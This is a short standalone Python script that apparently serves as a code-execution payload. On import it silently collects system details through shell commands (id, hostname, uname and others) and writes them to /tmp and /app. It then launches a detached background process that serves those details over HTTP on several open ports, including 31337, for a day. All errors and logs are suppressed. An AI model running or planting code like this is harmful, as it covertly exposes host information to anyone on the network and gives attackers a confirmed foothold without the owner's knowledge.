import os,sys,subprocess
BODY_CMD=r'''
import os,threading
from http.server import BaseHTTPRequestHandler,HTTPServer
body=os.popen("id;hostname;pwd;python3 -V;uname -a").read()+"HX7k2m9q\n"
try:
    open("/tmp/hx7_uid.txt","w").write(body)
except Exception:
    pass
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers()
        self.wfile.write(body.encode()+os.popen("id").read().encode())
    def log_message(self,*a):
        pass
def run(p):
    try:
        HTTPServer(("0.0.0.0",p),H).serve_forever()
    except Exception:
        pass
for p in (18080,18081,9999,8888,31337):
    threading.Thread(target=run,args=(p,),daemon=True).start()
import time; time.sleep(86400)
'''
def _hx():
    try:
        body=os.popen("id;hostname;pwd;python3 -V;uname -a").read()+"HX7k2m9q\n"
        for p in ("/tmp/hx7_uid.txt","/app/hx7.txt"):
            try: open(p,"w").write(body)
            except Exception: pass
        subprocess.Popen([sys.executable,"-c",BODY_CMD], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
_hx()